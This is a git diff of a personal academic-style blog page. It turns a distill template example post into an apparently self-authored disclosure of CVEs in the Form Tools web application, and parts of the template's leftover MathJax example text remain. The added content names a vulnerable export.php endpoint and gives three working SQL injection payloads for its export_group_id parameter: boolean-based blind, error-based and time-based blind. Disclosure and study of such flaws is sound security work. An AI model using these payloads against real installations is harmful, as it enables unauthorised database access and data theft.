@@ -10,7 +10,7 @@
   Bernardo  Rodrigues
 
 
-  | Blog test
+  | Blog
 
 </title>
 <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
@@ -91,39 +91,17 @@
 
   <d-front-matter>
     <script async type="text/json">{
-      "title": "a distill-style blog post",
-      "description": "an example of a distill-style blog post and main elements",
+      "title": "Form Tools - CVE's",
+      "description": "first public cves",
       "published": "May 22, 2021",
       "authors": [
         
         {
-          "author": "Albert Einstein",
+          "author": "Bernardo Rodrigues",
           "authorURL": "https://en.wikipedia.org/wiki/Albert_Einstein",
           "affiliations": [
             {
-              "name": "IAS, Princeton",
-              "url": ""
-            }
-          ]
-        },
-        
-        {
-          "author": "Boris Podolsky",
-          "authorURL": "https://en.wikipedia.org/wiki/Boris_Podolsky",
-          "affiliations": [
-            {
-              "name": "IAS, Princeton",
-              "url": ""
-            }
-          ]
-        },
-        
-        {
-          "author": "Nathan Rosen",
-          "authorURL": "https://en.wikipedia.org/wiki/Nathan_Rosen",
-          "affiliations": [
-            {
-              "name": "IAS, Princeton",
+              "name": "MITRE",
               "url": ""
             }
           ]
@@ -241,8 +219,8 @@
     <div class="post distill">
 
       <d-title>
-        <h1>a distill-style blog post</h1>
-        <p>an example of a distill-style blog post and main elements</p>
+        <h1>Form Tools - CVES</h1>
+        <p>First public CVES by Bernardo Rodrigues</p>
       </d-title>
 
       <d-byline></d-byline>
@@ -257,6 +235,33 @@ If you are interested in correctly adding dark mode support for distill, please 
 <p>This theme supports rendering beautiful math in inline and display modes using <a href="https://www.mathjax.org/" target="\_blank">MathJax 3</a> engine.
 You just need to surround your math expression with <code class="language-plaintext highlighter-rouge">$$</code>, like <code class="language-plaintext highlighter-rouge">$$ E = mc^2 $$</code>.
 If you leave it inside a paragraph, it will produce an inline expression, just like \(E = mc^2\).</p>
+
+<p>Endpoint vulnerable:</p>
+<p><code class="language-plaintext highlighter-rouge">modules/export_manager/export.php?export_group_id=1&export_group_1_results=all&export_type_id=1</code></p>
+
+<p>  The parameter <b>export_group_id</b> it’s vulnerable to:</p>
+
+<d-code block="" language="javascript">
+
+    <b>Type: boolean-based blind</b>
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: export_group_id=1 AND 5636=5636&export_group_1_results=all&export_type_id=1
+<br>
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: export_group_id=1 AND (SELECT 4229 FROM(SELECT COUNT(*),CONCAT(0x717a627171,
+    (SELECT (ELT(4229=4229,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY 
+    x)a)&export_group_1_results=all&
+    export_type_id=1
+<br>
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: export_group_id=1 AND (SELECT 1946 FROM (SELECT(SLEEP(5)))nmeR)&export_group_1_results=all&
+    export_type_id=1
+</d-code>
+
 
 <p>To use display mode, again surround your expression with <code class="language-plaintext highlighter-rouge">$$</code> and place it as a separate paragraph.
 Here is an example:</p>
